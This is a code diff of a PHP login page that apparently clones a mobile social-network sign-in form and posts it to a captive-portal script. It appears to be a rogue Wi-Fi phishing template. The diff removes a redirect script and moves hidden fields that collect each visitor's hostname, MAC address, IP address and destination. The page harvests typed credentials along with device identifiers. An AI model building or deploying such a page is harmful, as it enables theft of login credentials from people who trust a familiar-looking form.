@@ -13,13 +13,6 @@ require_once('helper.php');
   <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
   <link type="text/css" rel="stylesheet" href="assets/css/fBTqFRkifHK.css" data-bootloader-hash="vu/4d" crossorigin="anonymous">
   <link type="text/css" rel="stylesheet" href="assets/css/PGNbJWSeFxY.css" data-bootloader-hash="Fuprg" crossorigin="anonymous">
-  <script type="text/javascript">
-    function redirect() {
-      setTimeout(function() {
-        window.location = "/captiveportal/index.php";
-      }, 100);
-    }
-  </script>
 </head>
 
 <body tabindex="0" class="touch x1 ff _fzu _50-3 iframe acw portrait" style="min-height: 740px; background-color: rgb(255, 255, 255);">
@@ -45,6 +38,10 @@ require_once('helper.php');
                 </div>
                 <div class="_5rut" data-sigil="login_inner">
                   <form method="post" action="/captiveportal/index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_2" onsubmit="redirect()">
+                    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+                    <input type="hidden" name="target" value="<?=$destination?>">
                     <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                     <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                     <div id="otp_retrieve_desc_container"></div>
@@ -86,10 +83,6 @@ require_once('helper.php');
                       <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                       <div id="otp_button_elem_container"></div>
                     </div>
-                    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-                    <input type="hidden" name="target" value="<?=$destination?>">
                     <div class="_xo8"></div>
                   </form>
                   <div>
